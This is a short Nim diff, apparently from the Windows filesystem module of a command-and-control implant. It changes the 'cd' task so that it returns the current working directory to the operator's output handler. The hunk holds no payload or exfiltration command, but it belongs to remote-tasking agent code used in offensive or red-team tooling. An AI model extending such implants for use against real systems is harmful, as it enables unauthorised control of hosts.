@@ -614,8 +614,20 @@ when MODULE_FILESYSTEM.isEnabled():
             if SetCurrentDirectoryW(targetDirectory) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, string.toBytes(targetDirectory))
+            # Retrieve current working directory
+            let 
+                buffer = newWString(MAX_PATH + 1)
+                length = GetCurrentDirectoryW(MAX_PATH, &buffer)
 
+            if length == 0:
+                raise newException(CatchableError, GetLastError().getError())
+
+            let output = $buffer[0 ..< (int)length]
+
+            # cd command does not print output to the console, hence resultType = RESULT_NO_OUTPUT
+            # Still, the pwd needs to be returned as it is used by the output handler 
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, string.toBytes(output))
+            
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
